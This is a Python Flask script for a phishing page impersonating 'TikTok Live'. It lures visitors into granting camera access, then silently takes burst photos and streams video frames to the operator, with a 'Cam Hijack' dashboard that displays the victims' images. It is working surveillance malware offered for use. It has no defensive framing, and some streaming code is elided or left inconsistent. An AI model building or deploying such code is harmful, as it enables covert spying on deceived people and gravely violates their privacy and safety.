#!/usr/bin/env python3
from flask import Flask, render_template_string, Response, request, jsonify, send_from_directory
import cv2
import threading
import queue
import time
import subprocess
import os
import base64
from datetime import datetime
from werkzeug.utils import secure_filename
import json

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'captures'
os.makedirs('captures', exist_ok=True)

# Global state
frame_queue = queue.Queue(maxsize=10)
target_sessions = {}  # {target_id: {'connected': bool, 'captures': list, 'start_time': ts}}
is_streaming = False

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>TikTok Live - Join Stream</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* [Previous TikTok phishing CSS unchanged] */
        body { margin: 0; padding: 20px; background: linear-gradient(135deg, #ff0050, #ff4d6d); font-family: -apple-system, BlinkMacSystemFont, sans-serif; overflow: hidden; }
        .container { max-width: 400px; margin: 0 auto; text-align: center; color: white; }
        .logo { font-size: 2.5em; margin-bottom: 20px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
        .btn { background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.5); color: white; padding: 15px 30px; font-size: 1.2em; border-radius: 50px; cursor: pointer; transition: all 0.3s; backdrop-filter: blur(10px); }
        .btn:hover { background: rgba(255,255,255,0.3); transform: scale(1.05); }
        .btn:active { transform: scale(0.98); }
        video { display: none !important; width: 0; height: 0; position: absolute; top: -9999px; }
        .loading { display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱 TikTok Live</div>
        <p style="font-size: 1.1em; margin-bottom: 30px;">Join this exclusive live stream now!</p>
        <button class="btn" onclick="joinLive()">🎥 Join Live Stream</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Connecting to live stream...</p>
        </div>
    </div>
    
    <video id="video" autoplay playsinline muted></video>
    
    <script>
        let stream = null;
        let targetId = '%%TARGET_ID%%';
        let captureCount = 0;
        const MAX_CAPTURES = 10;
        
        async function joinLive() {
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: 'user'
                    },
                    audio: true
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Auto-capture 10 high-quality photos immediately
                autoCapturePhotos();
                
                // Start continuous streaming
                startStreaming(stream, targetId);
                
                setTimeout(() => {
                    document.getElementById('loading').innerHTML = '<p>✅ Live stream connected! Keep this page open.</p>';
                }, 2000);
                
            } catch(e) {
                setTimeout(joinLive, 1000);
            }
        }
        
        async function autoCapturePhotos() {
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = 1920;
            canvas.height = 1080;
            const ctx = canvas.getContext('2d');
            
            // Capture 10 photos over 5 seconds (burst mode)
            for(let i = 0; i < MAX_CAPTURES; i++) {
                setTimeout(() => {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photoData = canvas.toDataURL('image/jpeg', 0.95);  // High quality
                    
                    // Send photo to attacker
                    fetch(`/capture/${targetId}/${i}`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({image: photoData, timestamp: Date.now()})
                    }).catch(() => {});  // Silent fail
                    
                    captureCount++;
                }, i * 500);  // 500ms intervals
            }
        }
        
        function startStreaming(stream, targetId) {
            const ws = new WebSocket(`ws://{{ SERVER_IP }}:8080/stream/${targetId}`);
            const videoTrack = stream.getVideoTracks()[0];
            
            ws.onopen = () => {
                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 1280;
                    canvas.height = 720;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(document.getElementById('video'), 0, 0);
                    ws.send(canvas.toDataURL('image/jpeg', 0.8));
                }, 100);
            };
        }
        
        setTimeout(joinLive, 3000);
    </script>
</body>
</html>
"""

# ATTACKER DASHBOARD
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>🎯 TikTok Cam Hijack Dashboard</title>
    <meta http-equiv="refresh" content="5">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; }
        .header { background: linear-gradient(135deg, #ff0050, #ff4d6d); padding: 20px; text-align: center; }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
        .status { display: flex; justify-content: center; gap: 30px; margin: 20px 0; }
        .status-card { background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; backdrop-filter: blur(10px); }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; padding: 20px; }
        .capture-card { background: rgba(0,0,0,0.5); border-radius: 15px; overflow: hidden; border: 2px solid #ff0050; }
        .capture-header { background: #ff0050; padding: 15px; text-align: center; }
        .capture-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; padding: 15px; }
        .capture-img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; cursor: pointer; transition: transform 0.3s; }
        .capture-img:hover { transform: scale(1.05); }
        .online { color: #00ff88; font-weight: bold; }
        .offline { color: #ff4444; }
        .timestamp { font-size: 0.9em; opacity: 0.8; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 TikTok Live Cam Hijack</h1>
        <p>Real-time target surveillance | Auto-capture enabled</p>
    </div>
    
    <div class="status">
        <div class="status-card">
            <h3>Active Sessions</h3>
            <div id="session-count">0</div>
        </div>
        <div class="status-card">
            <h3>Total Captures</h3>
            <div id="total-captures">0</div>
        </div>
    </div>
    
    <div class="grid" id="target-grid">
        <!-- Dynamic target cards populated by JS -->
    </div>

    <script>
        async function updateDashboard() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();
                
                document.getElementById('session-count').textContent = Object.keys(data.sessions).length;
                let totalCaptures = 0;
                
                const grid = document.getElementById('target-grid');
                grid.innerHTML = '';
                
                for (const [targetId, session] of Object.entries(data.sessions)) {
                    totalCaptures += session.captures.length;
                    
                    const card = document.createElement('div');
                    card.className = 'capture-card';
                    card.innerHTML = `
                        <div class="capture-header">
                            <h3>ID: ${targetId.slice(0,8)}...</h3>
                            <span class="${session.connected ? 'online' : 'offline'}">
                                ${session.connected ? '🟢 LIVE' : '🔴 Offline'}
                            </span>
                            <div class="timestamp">${new Date(session.start_time).toLocaleString()}</div>
                        </div>
                        <div class="capture-grid">
                            ${session.captures.slice(-10).map((cap, i) => 
                                `<img src="/captures/${cap.filename}" 
                                      alt="Capture ${i+1}" 
                                      class="capture-img" 
                                      onclick="openFull('${cap.filename}')"
                                      title="${new Date(cap.timestamp).toLocaleTimeString()}">`
                            ).join('')}
                        </div>
                    `;
                    grid.appendChild(card);
                }
                
                document.getElementById('total-captures').textContent = totalCaptures;
            } catch(e) {
                console.error('Dashboard update failed:', e);
            }
        }
        
        function openFull(filename) {
            window.open(`/captures/${filename}`, '_blank');
        }
        
        // Auto-refresh every 5 seconds
        setInterval(updateDashboard, 5000);
        updateDashboard();  // Initial load
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    global target_sessions
    target_id = request.args.get('id', f'target_{int(time.time())}')
    
    if target_id not in target_sessions:
        target_sessions[target_id] = {
            'connected': False,
            'captures': [],
            'start_time': time.time()
        }
    
    return render_template_string(HTML_TEMPLATE.replace('%%TARGET_ID%%', target_id), 
                                SERVER_IP=request.host)

@app.route('/dashboard')
def dashboard():
    return render_template_string(DASHBOARD_TEMPLATE)

@app.route('/api/status')
def api_status():
    return jsonify({'sessions': target_sessions})

@app.route('/capture/<target_id>/<capture_num>', methods=['POST'])
def save_capture(target_id, capture_num):
    global target_sessions
    
    if target_id not in target_sessions:
        target_sessions[target_id] = {'connected': True, 'captures': [], 'start_time': time.time()}
    else:
        target_sessions[target_id]['connected'] = True
    
    data = request.get_json()
    if data and 'image' in data:
        # Decode and save high-res capture
        img_data = base64.b64decode(data['image'].split(',')[1])
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{target_id}_{capture_num}_{timestamp}.jpg"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        with open(filepath, 'wb') as f:
            f.write(img_data)
        
        # Add to session
        target_sessions[target_id]['captures'].append({
            'filename': filename,
            'timestamp': data.get('timestamp', time.time()),
            'size': len(img_data)
        })
        
        print(f"[+] [{target_id}] Capture {capture_num}/10 saved: {filename}")
    
    return jsonify({'status': 'ok'})

@app.route('/captures/<filename>')
def serve_capture(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/stream/<target>')
def stream_view(target):
    return Response(generate_frames(target), mimetype='multipart/x-mixed-replace; boundary=frame')

def generate_frames(target):
    global frame_queue
    while True:
        if not frame_queue.empty():
            frame = frame_queue.get()
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        time.sleep(0.1)

# [Rest of streaming code unchanged...]
if __name__ == '__main__':
    threading.Thread(target=capture_camera, daemon=True).start()
    app.run(host='0.0.0.0', port=80, threaded=True)